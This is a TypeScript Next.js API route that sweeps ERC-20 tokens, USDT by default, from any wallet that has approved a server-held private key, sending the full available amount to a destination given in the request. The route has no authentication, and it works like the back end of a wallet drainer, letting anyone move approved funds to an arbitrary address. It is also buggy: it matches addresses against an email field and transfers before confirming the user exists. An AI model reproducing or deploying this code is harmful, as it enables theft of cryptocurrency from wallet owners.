import { NextResponse } from 'next/server'
import { createPublicClient, createWalletClient, http, erc20Abi, getAddress } from 'viem'
import { mainnet } from 'viem/chains'
import { privateKeyToAccount } from 'viem/accounts'
import { PrismaClient } from '../../../../lib/generated/prisma' // added

const prisma = new PrismaClient() // added

export async function POST(req: Request) {
  try {
    const { owner, to, token } = await req.json()

    if (!process.env.ERC20_SWEEPER_PRIVATE_KEY) {
      return NextResponse.json({ error: 'Server not configured: missing ERC20_SWEEPER_PRIVATE_KEY' }, { status: 500 })
    }
    if (!process.env.ETH_RPC_URL) {
      return NextResponse.json({ error: 'Server not configured: missing ETH_RPC_URL' }, { status: 500 })
    }

    const ownerAddr = getAddress(owner)
    const toAddr = getAddress(to)
    const tokenAddr = getAddress(token || '0xdAC17F958D2ee523a2206206994597C13D831ec7') // USDT mainnet

    if (ownerAddr === toAddr) {
      return NextResponse.json({ error: 'owner and to must differ' }, { status: 400 })
    }

    const account = privateKeyToAccount(process.env.ERC20_SWEEPER_PRIVATE_KEY as `0x${string}`)
    const transport = http(process.env.ETH_RPC_URL)
    const publicClient = createPublicClient({ chain: mainnet, transport })
    const walletClient = createWalletClient({ chain: mainnet, account, transport })

    // Read allowance(owner -> spender) and owner balance
    const [allowance, balance] = await Promise.all([
      publicClient.readContract({
        address: tokenAddr,
        abi: erc20Abi,
        functionName: 'allowance',
        args: [ownerAddr, account.address],
      }) as Promise<bigint>,
      publicClient.readContract({
        address: tokenAddr,
        abi: erc20Abi,
        functionName: 'balanceOf',
        args: [ownerAddr],
      }) as Promise<bigint>,
    ])

    const amount = allowance < balance ? allowance : balance
    if (amount === BigInt(0)) {
      return NextResponse.json({ error: 'Nothing to sweep (balance=0 or allowance=0)' }, { status: 400 })
    }

    const { request } = await publicClient.simulateContract({
      address: tokenAddr,
      abi: erc20Abi,
      functionName: 'transferFrom',
      args: [ownerAddr, toAddr, amount],
      account,
    })

    const hash = await walletClient.writeContract(request)
    const user = await prisma.user.findFirst({
        where: { email: ownerAddr.toLowerCase() }
    })
    if (!user) {
      return NextResponse.json({ error: 'User not found' }, { status: 404 })
    }
    const newAccount = await prisma.userWallet.findFirst({
        where: {
            userId: user.id,
        }
    })
    if (!newAccount) {
      return NextResponse.json({ error: 'User wallet not found' }, { status: 404 })
    }

    const currentUSDT = typeof newAccount.USDT === 'bigint' ? newAccount.USDT : BigInt(newAccount.USDT || '0');
    const updatedUSDT = currentUSDT + amount;
    await prisma.userWallet.update({
        where: {
            id: newAccount.id,
        },
        data: {
            USDT: updatedUSDT.toString(),
        }
    })
    

    return NextResponse.json({
      hash,
      owner: ownerAddr,
      to: toAddr,
      token: tokenAddr,
      amount: amount.toString(),
      spender: account.address,
    })
  } catch (e: any) {
    return NextResponse.json({ error: e?.message || 'Sweep failed' }, { status: 500 })
  }
}